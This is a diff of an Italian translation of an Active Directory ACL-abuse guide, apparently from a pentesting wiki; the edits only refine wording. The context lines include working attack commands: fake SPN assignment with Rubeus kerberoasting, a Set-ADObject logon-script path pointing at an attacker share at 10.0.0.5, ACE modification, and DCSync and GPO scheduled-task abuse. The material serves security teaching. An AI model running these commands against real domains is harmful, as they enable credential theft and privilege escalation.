@@ -22,7 +22,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 Questo privilegio concede a un attaccante il pieno controllo su un account utente target. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:
 
 * **Cambiare la Password del Target**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
-* **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket-granting ticket (TGT).
+* **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastabile, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket di concessione del ticket (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
@@ -93,7 +93,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite su Utente**
 
-Questo permesso consente a un attaccante di modificare le proprietà dell'utente. In particolare, con accesso `GenericWrite`, l'attaccante può cambiare il percorso dello script di accesso di un utente per eseguire uno script malevolo al momento dell'accesso dell'utente. Questo viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target per puntare allo script dell'attaccante.
+Questo permesso consente a un attaccante di modificare le proprietà dell'utente. In particolare, con l'accesso `GenericWrite`, l'attaccante può cambiare il percorso dello script di accesso di un utente per eseguire uno script malevolo al momento dell'accesso dell'utente. Questo viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target per puntare allo script dell'attaccante.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -117,9 +117,9 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Replica nel Dominio (DCSync)**
+## **Replica sul Dominio (DCSync)**
 
-L'attacco DCSync sfrutta specifici permessi di replica nel dominio per mimare un Domain Controller e sincronizzare dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
+L'attacco DCSync sfrutta specifici permessi di replica sul dominio per imitare un Domain Controller e sincronizzare dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
 
 ## Delegazione GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
@@ -162,9 +162,9 @@ Gli aggiornamenti GPO si verificano tipicamente ogni 90 minuti. Per accelerare q
 
 ### Dietro le quinte
 
-Dopo aver ispezionato i Task Pianificati per un dato GPO, come la `Politica Malconfigurata`, è possibile confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o di elevare i privilegi.
+Dopo aver ispezionato i Compiti Pianificati per un dato GPO, come la `Politica Malconfigurata`, è possibile confermare l'aggiunta di compiti come `evilTask`. Questi compiti vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o di elevare i privilegi.
 
-La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, delinea le specifiche del task pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i task pianificati sono definiti e gestiti all'interno dei GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.
+La struttura del compito, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, delinea le specifiche del compito pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i compiti pianificati sono definiti e gestiti all'interno dei GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.
 
 ### Utenti e Gruppi
 
